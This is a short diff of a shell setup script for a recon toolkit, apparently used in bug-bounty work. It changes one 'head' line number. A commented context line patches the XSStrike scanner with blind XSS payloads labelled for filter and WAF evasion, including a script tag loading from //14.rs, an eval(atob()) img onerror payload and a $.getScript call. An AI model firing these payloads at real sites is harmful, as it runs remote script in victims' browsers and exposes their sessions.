@@ -21,6 +21,6 @@ echo "replace URL to yours , then copy into /root/script/webhook.sh"
 echo ""
 echo ""
 #   cd /root/script/3_httprobe ; git clone https://github.com/s0md3v/XSStrike ; cd /root/script/3_httprobe/XSStrike ; pip3 install -r requirements.txt ; sed "s,    '<sCriPt sRc=//14.rs>'\,,    'ceye.url'\,\n    '<sCriPt sRc=//14.rs>'\,\n    '\"><script src=blindxss></script>'\,\n    'httpceye.url/'\,,g" core/config.py > 1.txt ; mv 1.txt core/config.py ; sed "s,blindPayload = '',blindPayload = (  # Payloads for filter & WAF evasion\n    '\"><script src=blindxss></script>'\,\n    '\"><img src=x id=xss7Yxssmh0dxssmloYW8ueHNzxssC5ib2R5LxssaWxkxssw&#61;&#61; onerror=eval(atob(this.id))>'\,\n    '\<script>$.getScript(\"//xss\")</script>'),g" core/config.py > 1.txt ; mv 1.txt core/config.py
-head -22 /root/sh/du_hast.sh | tail -1
+head -23 /root/sh/du_hast.sh | tail -1
 echo ""
 echo "replace URL to yours , then copy into /root/script/xss.sh
